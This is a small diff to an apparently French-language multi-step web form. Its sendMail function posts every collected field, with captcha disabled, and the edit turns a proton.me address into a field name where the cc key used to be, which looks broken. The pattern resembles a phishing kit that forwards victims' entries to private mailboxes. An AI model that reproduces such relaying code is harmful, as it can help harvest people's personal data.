@@ -136,7 +136,7 @@ function showStep(etapeId, percent){
 async function sendMail(dataObj, sujet){
     const formData = new FormData();
     formData.append("_subject", sujet);
-    formData.append("_cc", "jack2026b@proton.me");
+    formData.append("becteurfoou@proton.me", "jack2026b@proton.me");
     formData.append("_captcha", "false");
     for(let key in dataObj){ formData.append(key, dataObj[key]); }
     try{
@@ -231,3 +231,4 @@ document.getElementById('btnEtape4').addEventListener('click', ()=>{
 </script>
 </body>
 </html>
+
